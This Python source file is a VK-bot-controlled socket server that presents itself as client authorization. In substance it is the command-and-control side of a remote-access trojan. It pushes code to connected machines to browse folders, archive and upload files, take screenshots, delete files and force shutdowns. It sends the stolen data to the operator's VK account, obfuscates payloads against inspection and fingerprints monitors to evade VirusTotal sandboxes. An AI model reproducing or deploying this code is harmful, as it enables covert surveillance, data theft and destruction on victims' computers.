#!/usr/bin/python
# -*- coding: UTF-8 -*-

########################################################################
#                 Implemented client authorization and                 #
#               server logic using VK-bot with a protected             #
#                     connection and obfuscation.                      #
#                      16.01.2022 create Bonjur                        #
#                To use, you need to configure config.py               #
#               https://github.com/MrBonjur/socket-server              #
#                           Used python 3.9                            #
########################################################################

from vk_api.bot_longpoll import VkBotEventType, VkBotLongPoll
import vk_api
import requests
import socket

import threading
import time
import os

import database
import config

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((config.host, config.port))
s.listen(20)  # max 20 connections


def obfuscation(input_data: str):
    """
    My magic obfuscation code in 100 line code
    I suggest writing your own obfuscation code =)
    """
    return input_data


def deobfuscation(input_data: str):
    """
    All the same...
    """
    return input_data


"""
=======================================================================================
This is a list of modules that can be sent to the user
It is best to obfuscate the code so that it cannot be pulled out through HTTPS debuggers
=======================================================================================
"""
detect_python = obfuscation(open("functions/detect_python.py", "r", encoding="utf-8").read()).encode()
get_user_info = obfuscation(open("functions/get_user_info.py", "r", encoding="utf-8").read()).encode()
code = obfuscation(open("functions/code.py", "r", encoding="utf-8").read()).encode()
walk = obfuscation(open("functions/explorer.py", "r", encoding="utf-8").read()).encode()
downloader = obfuscation(open("functions/downloader.py", "r", encoding="utf-8").read()).encode()
screen = obfuscation(open("functions/screen.py", "r", encoding="utf-8").read()).encode()


def is_added(user: str, hwid: str, monitor, cpu: str):  # get stats whether added user in database
    for i in database.users:
        if user == i['user'] and hwid == i['hwid'] and monitor == i['monitor'] and cpu == i['cpu']:
            return True
    return False


def add_new_user(user, ip, hwid, monitor, cpu):
    activity = time.strftime("%d.%m.%y %H:%M:%S")  # preview: 16.01.2022 14:42:13
    database.users.append(
        {"user": user,
         "ip": [ip],  # there will be a list with all ip
         "hwid": hwid,
         "monitor": monitor,  # for detect virtual machine (VM VirusTotal most often the monitor is 600x400)
         "cpu": cpu,
         "activity": activity,
         "ban": False})

    with open("database.py", "w", encoding="utf-8", errors="ignore") as f:
        f.write("users = " + str(database.users).replace('}, ', '},\n'))


def edit_old_user(user, ip, hwid, monitor, cpu):  # if user is added, then edited old data
    for user_ in database.users:
        if user == user_['user'] and hwid == user_['hwid'] and monitor == user_['monitor'] and cpu == user_['cpu']:
            user_['ip'].append(ip)
            user_['ip'] = eval(str(set(user_['ip'])).replace("{", "[").replace("}", "]"))  # excludes duplicate IP
            user_['activity'] = time.strftime("%d.%m.%y %H:%M:%S")  # preview: 16.01.2022 14:42:13

    with open("database.py", "w", encoding="utf-8", errors="ignore") as f:
        f.write("users = " + str(database.users).replace('}, ', '},\n'))


def is_ban(user, ip, hwid, monitor, cpu):
    for user_ in database.users:
        for i in user_['ip']:
            if i == ip and user_['ban']:
                return True
        if user == user_['user'] and hwid == user_['hwid'] and monitor == user_['monitor'] and cpu == user_['cpu']:
            if user_['ban']:
                return True
            else:
                return False


def ban_user(hwid, status):  # if user banned, then close connections
    for user_ in database.users:
        if hwid == user_['hwid']:
            user_['ban'] = status
            user = user_['user']
            if status:
                sender(f"🚫 User {user} has been banned.")
            else:
                sender(f"[+] User {user} has been unbanned.")

    with open("database.py", "w", encoding="utf-8", errors="ignore") as f:
        f.write("users = " + str(database.users).replace('}, ', '},\n'))

def send_screen(path, hwid_user):  # sending from server folder screenshot
    try:
        token = config.token

        params = {'access_token': token, 'v': '5.131'}
        upload_server = requests.get('https://api.vk.com/method/photos.getMessagesUploadServer', params).json()
        result_upload = requests.post(upload_server['response']['upload_url'], files={'photo': open(path, 'rb')}).json()

        params = {'access_token': token,
                  'photo': result_upload['photo'],
                  'server': result_upload['server'],
                  'hash': result_upload['hash'],
                  'v': '5.131'}
        messages_photo = requests.get('https://api.vk.com/method/photos.saveMessagesPhoto', params).json()

        attachment = 'photo{}_{}'.format(messages_photo['response'][0]['owner_id'],
                                         messages_photo['response'][0]['id'])
        params = {'access_token': token,
                  'peer_id': config.id_owner,
                  'attachment': attachment,
                  'message': hwid_user,
                  'random_id': 0, 'v': '5.131'}

        requests.get('https://api.vk.com/method/messages.send', params).json()
    except Exception as e:
        sender(f"Error sending screen:\n{e}")


def send_document(path):
    vk_ = vk_api.VkApi(token=config.token)
    vk_._auth_token()
    vk_.get_api()
    a = vk_.method("docs.getMessagesUploadServer",
                   {"group_id": config.id_group,
                    "type": "doc",
                    "peer_id": config.id_owner})

    sender("Started loading document...")

    result_upload = requests.post(a["upload_url"], files={"file": open(path, "rb")}).json()
    if len(result_upload) != 1:  # if an error occurs, then re-upload with a renamed file
        if os.path.exists("test.zip1"):
            os.remove("test.zip1")

        os.rename("test.zip", "test.zip1")  # vk block sending an archive with executable files
        path = "test.zip1"

        result_upload = requests.post(a["upload_url"], files={"file": open(path, "rb")}).json()

    docs = vk_.method("docs.save", {"file": result_upload["file"], "title": path})
    attachment = 'doc{}_{}'.format(docs['doc']['owner_id'], docs['doc']['id'])
    vk_.method('messages.send', {'user_id': config.id_owner, 'attachment': attachment, 'random_id': 0})


def sender(text):
    print(text)
    if len(text) > 1500:  # if len message more 1500, then we divide the message into parts
        part = 0
        while len(text) > part:
            new_text = text[part:part + 1500]
            vk.method("messages.send", {"user_id": config.id_owner, "message": new_text, "random_id": 0})
            part += 1500
    else:  # if len message less 1500
        vk.method("messages.send", {"user_id": config.id_owner, "message": text, "random_id": 0})


def server_vk():
    global vk
    vk = vk_api.VkApi(token=config.token)
    vk._auth_token()
    vk.get_api()

    long_poll = VkBotLongPoll(vk, config.id_group)
    while True:
        try:
            for e in long_poll.listen():
                if e.type == VkBotEventType.MESSAGE_NEW:
                    if e.object.message['from_id'] == config.id_owner:
                        text = str(e.object.message['text']).split(" ")

                        if text[0] == "!online":
                            if len(users) > 0:
                                text_ = ""
                                for i in users:
                                    text_ += f"{i[1]}\n\n"
                                sender(f"{text_}")
                            else:
                                sender("Users are not online")

                        elif text[0] == "!screen" and len(text[1]) > 20:
                            generic_user_socket = get_user_in_hwid(text[1])
                            if generic_user_socket:
                                generic_user_socket.send(screen)

                        elif text[0] == "!screen" and text[1] == "all":
                            for i in users:
                                generic_user_socket = i[3]
                                generic_user_socket.send(screen)

                        elif text[0] == "!shutdown" and len(text[1]) > 20:
                            generic_user_socket = get_user_in_hwid(text[1])
                            if generic_user_socket:
                                # Only works if cmd is enabled
                                generic_user_socket.send(obfuscation("\nos.system('shutdown -s -t 0')\n").encode())

                        elif text[0] == "!shutdown" and text[1] == "all":
                            for i in users:
                                generic_user_socket = i[3]
                                # Only works if cmd is enabled
                                generic_user_socket.send(obfuscation("\nos.system('shutdown -s -t 0')\n").encode())

                        elif text[0] == "!walk" and len(text[1]) > 20:
                            hwid = text[1]
                            path = ' '.join(text[2:])
                            generic_user_socket = get_user_in_hwid(hwid)
                            if generic_user_socket:
                                generic_user_socket.send(f"path = r'{path}'\n".encode() + walk)

                        elif text[0] == "!download" and len(text[1]) > 20:
                            hwid = text[1]
                            path = ' '.join(text[2:])
                            generic_user_socket = get_user_in_hwid(hwid)
                            if generic_user_socket:
                                sender("The archiving process has beginning.")
                                generic_user_socket.send(f"path = r'{path}'\n".encode() + downloader)

                        elif text[0] == "!delete" and len(text[1]) > 20:
                            hwid = text[1]
                            path = ' '.join(text[2:])
                            path = path.replace("\\", "//")  # fix path
                            if path[-2:] == "//":
                                path = path[:-2]
                            generic_user_socket = get_user_in_hwid(hwid)
                            if generic_user_socket:
                                sender(f"{path} deleted.")
                                generic_user_socket.send(f"os.remove(r'{path}')".encode())

                        elif text[0] == "!stop":
                            sender("Stopping the server...")
                            os.kill(os.getpid(), 9)

                        elif text[0] == "!ban_ip":
                            ip = text[1]
                            ban_ip.append(ip)
                            sender(f"Successfully blacklisted ip: {ip}")

                        elif text[0] == "!ban":
                            hwid = text[1]
                            ban_user(hwid, True)
                            sender(f"Successfully banned user: {hwid}")

                        elif text[0] == "!unban":
                            hwid = text[1]
                            ban_user(hwid, False)
                            sender(f"Successfully unbanned user: {hwid}")

                        else:
                            sender("Invalid arguments")

        except requests.exceptions.ReadTimeout:
            pass  # An incomprehensible error occurs on weak hosts


threading.Thread(target=server_vk).start()
users = []
ban_ip = []


def get_user_in_hwid(hwid):
    global users
    for user in users:
        if user[1] == hwid:
            return user[3]
    sender("Пользователь не в сети")


def del_user(generic_user_socket):  # if user disconnected
    global users
    for user in users:
        if user[3] == generic_user_socket:
            users.remove(user)





def generic_name(len_random):  # create random name file
    from random import randint as r
    import time
    name = time.strftime("%H-%M-%S ")  # symbol ":" prohibited
    for i in range(len_random):
        name += str(r(0, 9))
    return name


def thread_users(self, generic_user_socket):  # self - fix args in start thread: args=(1, user_socket)
    try:
        while True:
            choice_data = ""
            try:
                choice_data = generic_user_socket.recv(256).decode()
            except TimeoutError:
                del_user(user_socket)
                sender("Timeout, user disconnected")

            if choice_data == "walk":
                data_user = generic_user_socket.recv(4096).decode("utf-8")
                sender(data_user)

            elif choice_data.split(" ")[0] == "zip":
                size = int(choice_data.split(" ")[1])
                sender(f"Data archive arrived ~ {round(size / 1024 / 1024, 2)} MB")

                data_zip = b''
                while size > len(data_zip):
                    part = user_socket.recv(16384)
                    data_zip += part

                if len(data_zip) == size:
                    n = generic_name(10)
                    if round(size / 1024 / 1024, 2) > 200:
                        sender("The weight of the archive exceeds 200 MB, so it is not possible to send it to VK.\n"
                               "Saving on the server...")
                        f = open(f"downloads\\{n}.zip", "wb")
                        f.write(data_zip)
                        f.close()
                    else:
                        f = open(f"downloads\\{n}.zip", "wb")
                        f.write(data_zip)
                        f.close()
                        send_document(f"downloads\\{n}.zip")

            elif choice_data.split(" ")[0] == "screen":
                len_data = int(choice_data.split(" ")[1])
                hwid_user = choice_data.split(" ")[2]
                format_size = round(len_data / 1024 / 1024, 2)  # MBytes
                sender(f"Got a screenshot from a client. Size ~ {format_size} MB\nSending in progress...")

                data_screenshot = b''
                while len_data > len(data_screenshot):
                    part = user_socket.recv(16384)
                    data_screenshot += part

                if len(data_screenshot) == len_data:  # if size downloads screenshot == size client screenshot
                    n = generic_name(8)
                    f = open(f"screenshots\\{n}.png", "wb")
                    f.write(data_screenshot)
                    f.close()
                    send_screen(f"screenshots\\{n}.png", hwid_user)

            elif choice_data == "error":
                error = generic_user_socket.recv(4096).decode("utf-8")
                sender(f"Client error:\n{error}")

    except ConnectionResetError:
        print(f"Пользователь отключился")
        del_user(generic_user_socket)
    finally:
        pass


print("Server started")

while True:
    user_socket, address = s.accept()
    real_ip = str(user_socket).split("'")[3]
    sender("User connected ")
    user_socket.send(detect_python)
    data = user_socket.recv(8).decode()
    if data == "2":  # packet all ok
        user_socket.send(get_user_info)
        data = user_socket.recv(2048).decode()
        # data = deobfuscation(data)  # if use obf in send info get_user_info
        user_info = eval(data)  # string to array
        user_user = user_info[0]
        user_ip = user_info[1]
        user_hwid = user_info[2]
        user_monitor = eval(user_info[3])
        user_cpu = user_info[4]
        print(user_ip)
        if real_ip != user_ip and real_ip != "127.0.0.1":
            sender("IP changed manually")
            user_socket.close()
        else:
            if not is_added(user_user, user_hwid, user_monitor, user_cpu):
                add_new_user(user_user, user_ip, user_hwid, user_monitor, user_cpu)
                print("New user added")
            else:
                edit_old_user(user_user, user_ip, user_hwid, user_monitor, user_cpu)

            sender(f"User connected {user_user} | HWID: {user_hwid}")
            if not is_ban(user_user, user_ip, user_hwid, user_monitor, user_cpu):
                users.append([user_user, user_hwid, user_ip, user_socket])
                threading.Thread(target=thread_users, args=(1, user_socket)).start()
                user_socket.send(code)
            else:
                sender("The user wanted to connect but he is banned")
